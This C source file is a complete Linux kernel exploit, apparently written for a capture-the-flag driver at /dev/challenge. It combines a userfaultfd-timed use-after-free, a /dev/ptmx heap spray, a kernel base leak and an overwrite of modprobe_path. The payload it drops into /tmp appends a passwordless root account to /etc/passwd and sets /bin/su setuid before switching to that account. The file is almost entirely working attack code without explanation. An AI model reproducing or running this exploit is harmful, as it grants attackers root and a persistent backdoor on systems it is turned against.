#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>



typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG


#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define PAGE_SIZE 0x1000

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002
cpu_set_t pwn_cpu;
u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;
int devfd; 
void *page;
u64 victim;
char* buffer;
u64 kbase, kheap; 
#define ADDR(x) (kbase - 0xffffffff81000000 + x) 
void panic(char*str){
    write(1, str, strlen(str));
    exit(-1);
}


void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

void getShell()
{
    if (getuid())
    {
        puts("Bye");
    }
    write(1, "Get root\n", 10);
    char* argv[] = { "/bin/sh", NULL };
    char** envp = &argv[1];
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}
u64 page_size;


#define CMD_ADD 0x13370001
#define CMD_SET 0x13370002
#define CMD_GET 0x13370003
#define CMD_DEL 0x13370004


typedef struct {
  u64 idx;
  u64 *note_size;
  size_t size;
  char *data;
} request;


int add(u32 idx, u32 size, char* data, u64 note_size){
    request req;
    req.note_size = note_size;
    req.idx = idx;
    req.size = size;

    req.data = data;
    return ioctl(devfd, CMD_ADD, &req);
}

int del(u32 idx){
    request req;
    req.idx = idx;
    return ioctl(devfd, CMD_DEL, &req);
}

int get(u32 idx, u32 size, char*data){
    request req;
    req.size = size;
    req.idx = idx;
    req.data = data;
    return ioctl(devfd, CMD_GET, &req);
}

int set(u32 idx, u32 size, char* data, u64 note_size){
    request req;
    req.note_size = note_size;
    req.size = size;
    req.idx = idx;
    req.data = data;
    return ioctl(devfd, CMD_SET, &req);    
}

u32 id = 0, id1 = 0;
u32 win = 0;
void *race(){
    while (!win){
        //printf("ID: 0x%llx\n", id);
        del(id);
    }
}
i32 ptmx[0x100];
void *handler(void *arg){
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd poll_fd;
    static int count = 0;
    i64 uffd;
    uffd = (i64)arg;
    poll_fd.fd = uffd;
    poll_fd.events = POLLIN;
    while(poll(&poll_fd, 1, -1) > 0){
        if(poll_fd.revents & POLLERR || poll_fd.revents & POLLHUP){
            panic("poll");
        }
        if(read(uffd, &msg, sizeof(msg)) <= 0){
            panic("read from uffd");
        }
        logOK("Successfully read from uffd");
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        switch(count++){
            case 0:           
                puts("Trigger UAF read");
                del(0);
                for (u32 i = 0; i < 0x40; i++){
                    ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                    if (ptmx[i] < 0){
                        panic("Failed to open ptmx");
                    }
                }
                copy.src = (u64)buffer;
                break;
            case 1:
                puts("UAF Write");
                for (u32 i = 0x0; i < 0x100; i++){
                    add(1, 0x2f0, buffer, 0x100005401);
                }
                logOK("Prepare to arb write");
                del(0);
                for (u32 i = 0; i < 0x40; i++){
                    ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                    if (ptmx[i] < 0){
                        panic("Failed to open ptmx");
                    }
                }
                copy.src = (u64)buffer;
                break;
            default: 
                panic("Failed to poll");
        }
        copy.dst = (u64)msg.arg.pagefault.address & (~0xfff);
        printf("Copy destination: 0x%llx\n", copy.dst);
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1){
            panic("UFFDIO_COPY");
        }
    }
}

void setup_pagefault(void *addr, u64 len){
    i64 uffd;
    pthread_t th;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    
    page_size = sysconf(_SC_PAGE_SIZE);
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1){
      panic("userfaultfd");
    }
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1){
        panic("UFFD_API");
    }
    uffdio_register.range.start = (u64)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1){
        panic("UFFDIO_REGISTER");
    }
    if (pthread_create(&th, NULL, handler, (void*)uffd)){
        panic("pthread_create");
    }


}


int main(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_cpu(0);
    save_state();

    devfd = open("/dev/challenge", O_RDWR);
    if (devfd < 0){
        logErr("Failed to open device");
        exit(-1);
    }
    logOK("Opened device");
    buffer = (char*)malloc(0x1000);
    page = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (page == MAP_FAILED){
        panic("mmap");
    }
    printf("Setup pagefault\n");
    setup_pagefault(page, 0x4000);
    add(0, 0x2e0, buffer, 0x100005401);
    get(0, 0x2e0, page);
    kbase = *(u64*)((u64*)page + 2) - 0x12752c0;
    kheap = *(u64*)((u64*)page + 6) - 0x38;
    u64 pop_rdi = kbase + 0x1db4;
    u64 commit_creds = ADDR(0xffffffff81092c60);
    u64 init_cred = ADDR(0xffffffff828502a0);
    u64 kpti_trampoline = ADDR(0xffffffff81e00e06);
    printf("Kbase: 0x%llx\n", kbase);
    printf("Kheap: 0x%llx\n", kheap);

    for (u32 i = 0; i < 0x40; i++){
        close(ptmx[i]);
    }
    u64 modprobe_path = kbase + 0x1850ce0;
    u64 mov_dword_rdx_esi = kbase + 0x2963fa; 
    u64 *rop = (u64*)buffer;
    memcpy(buffer, page, 0x2e0);
    rop[1] = *(u64*)(page + 0x8);
    rop[2] = kheap;
    rop[11] = mov_dword_rdx_esi;
    u32 *new_modprobe = "/tmp/haha";
    char *dummy = "/tmp/a";
    
    system("echo -en '\xff\xff\xff\xff' > /tmp/a");
    system("chmod +x /tmp/a");
    system("echo -e \"#!/bin/sh\necho 'pwn::0:0:root:/:/bin/sh' >> /etc/passwd\n/bin/chmod +s /bin/su\" > /tmp/haha");
    system("chmod +x /tmp/haha");

    add(0, 0x2e0, buffer, 0x100005401);
    set(0, 0x2e0, page + 0x1000, 0x100005401);

    
    for (u64 i = 0; i < 0x40; i++){
        ioctl(ptmx[i], new_modprobe[0], modprobe_path);
    }
    for (u64 i = 0; i < 0x40; i++){
        ioctl(ptmx[i], new_modprobe[1], modprobe_path + 4);
    }
    for (u64 i = 0; i < 0x40; i++){
        ioctl(ptmx[i], new_modprobe[2], modprobe_path + 8);
    }
    system("/tmp/a");
    system("cat /etc/passwd");
    system("su pwn");

    getchar();
    


    





}  